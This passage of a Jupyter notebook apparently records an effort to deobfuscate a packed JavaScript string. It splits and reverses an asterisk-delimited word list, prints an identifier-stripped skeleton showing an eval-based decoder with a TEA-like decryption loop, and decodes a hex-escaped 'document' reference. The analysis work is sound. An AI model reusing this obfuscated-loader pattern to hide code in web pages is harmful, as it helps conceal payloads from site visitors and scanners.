qk*HWFShDHe44QG3xMzqtkDjPF7L4Ix7*M7JgrZspyS4kc*zeR9GNyNmEfbyK*eval*86eHPf9YN3*true*yOgaV7gTJK73IoMxaEc6pn0s*hTlgLLZXGfcq6rIDtfICRvU4DJjvV15qrPAO*HJ6cBt2R0Jw9DYR1KzZYY2A7WbP4tF4fwRmzBDRVLcH2lhN8OavWS';"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "241"
      ]
     },
     "execution_count": 38,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(vhz2z4.split('*'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "test='*'*65+vhz2z4"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "test = test.split('*')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "test.reverse()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "306"
      ]
     },
     "execution_count": 44,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(test)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'i i=i,i=i(\\'i\\'+\\'i\\'+\\'i\\'+\\'i\\'),i=\\'%i\\'+\\'%i\\'+\\'%i\\'+\\'%i\\'+\\'%i\\'+\\'%i\\'+\\'%i\\'+\\'%i\\',i=\\'%i\\'+\\'%i\\'+\\'%i\\'+\\'%i\\'+\\'%i\\'+\\'%i\\'+\\'%i%i\\',i=\\'i/i+i+i/i/i/+i+i+i/i+i/i+i/i/i/i/i/i+i+i+i+i+i+i+i+i/i/i+i/i/i+i+i+i+i+i+i+i+i/i/i+i/i/i+i+i/i+i+i/i/i/i/i/i++i+i+i+i\\',i=\\'%i\\'+\\'%i%i%i\\'+\\'%i\\',i;i i(i){i i,i,i,i;i i,i;i=[];i=i.i;i=i;i(i<i){i=i.i(i++);i(i>>i){i i:i i:i i:i i:i i:i i:i i:i i:i[i.i]=i.i(i-i);i;i i:i i:i=i.i(i++);i[i.i]=i[\\'i\\'](((i&i)<<i)|(i&i));i;i i:i=i.i(i++);i=i.i(i++);i[i.i]=i[\\'i\\'+\\'i\\'+\\'i\\'+\\'i\\'](((i&i)<<i)|((i&i)<<i)|((i&i)<<i));i}}i i.i(\\'\\')}i i=\\'%i\\'+\\'%i\\'+\\'%i\\'+\\'%i\\'+\\'%i\\'+\\'%i\\'+\\'%i\\';i i=i i(-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,-i,i,-i,-i,-i,i,i,i,i,i,i,i,i,i,i,i,-i,-i,-i,-i,-i,-i,-i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,-i,-i,-i,-i,-i,-i,i,i,i,i,i\\ni\\n,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,-i,-i,-i,-i,-i);i=i(i);i i(i){i i,i,i,i;i i,i,i;i=i.i;i=i;i=\"\";i(i<i){i{i=i[i.i(i++)&i]}i(i<i&&i==-i);i(i==-i)i;i{i=i[i.i(i++)&i]}i(i<i&&i==-i);i(i==-i)i;i+=i.i((i\\ni\\n<<i)|((i&i)>>i));i{i=i.i(i++)&i;i(i==i)i i;i=i[i]}i(i<i&&i==-i);i(i==-i)i;i+=i.i(((i&i)<<i)|((i&i)>>i));i{i=i.i(i++)&i;i(i==i)i i;i=i[i]}i(i<i&&i==-i);i(i==-i)i;i+=i[\\'i\\'+\\'i\\'+\\'i\\'](((i&i)<<i)|i)}i i}i i(i,i){i i=i.i;i i=i[i-i]&i;i(i i=i;i<i;i++){i[i]=i.i(i[i]&i,i[i]>>>i&i,i[i]>>>i&i,i[i]>>>i&i)}i(i){i i.i(\\'\\').i(i,i)}i{i i.i(\\'\\')}}i i(i,i){i i=i.i;i i=[];i(i i=i;i<i;i+=i){i[i>>i]=i.i(i)|i.i(i+i)<<i|i.i(i+i)<<i|i.i(i+i)<<i}i(i){i[i.i]=i}i i}i=i(i+i);i i(i,i){i(i==\"\"){i\"\"}i i=i(i,i);i i=i(i,i);i i=i.i-i;i i=i[i-i],i=i[i],i=i;i i,i,i=i.i(i+i/(i+i)),i=i*i&i;i(i!=i){i=i>>>i&i;i(i i=i;i>i;i--){i=i[i-i];i=(i>>>i^i<<i)+(i>>>i^i<<i)^(i^i)+(i[i&i^i]^i);i=i[i]=i[i]-i&i}i=i[i];i=(i>>>i^i<<i)+(i>>>i^i<<i)^(i^i)+(i[i&i^i]^i);i=i[i]=i[i]-i&i;i=i-i&i}i i(i,i)}i=i(i);i=\\'i/i+i+i+i+i+i+i+i/i+i/i+i/i+i+i+i/i+i+i+i+i/i+i/i+i+i/i/i/i+i/i+i+i+i/i/i+i/i+i+i/i+i+i/i+i+i+i/+\\'+i+\\'+i/i+i+i+i/i/i/i/i+i+i+i/i+i+i/i/i/i+i+i+i+i+i+i/i+i/i+i/i/i+i+i/i+i+i/i/i/i+i\\';i=i(i(i(i),i));i[i][i](i)'"
      ]
     },
     "execution_count": 46,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "cipher"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'6iJLK2aWHg9JPUx0Eum1ni'"
      ]
     },
     "execution_count": 53,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "test[125]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "ename": "TypeError",
     "evalue": "an integer is required",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-62-d565e120d861>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m()\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0;32mprint\u001b[0m \u001b[0mchr\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'%64%6f%63%75%6d%65%6e%74'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;31mTypeError\u001b[0m: an integer is required"
     ]
    }
   ],
   "source": [
    "print chr('%64%6f%63%75%6d%65%6e%74')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "anaconda-cloud": {},
  "kernelspec": {
   "display_name": "Python [Root]",
   "language": "python",
   "name": "Python [Root]"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}
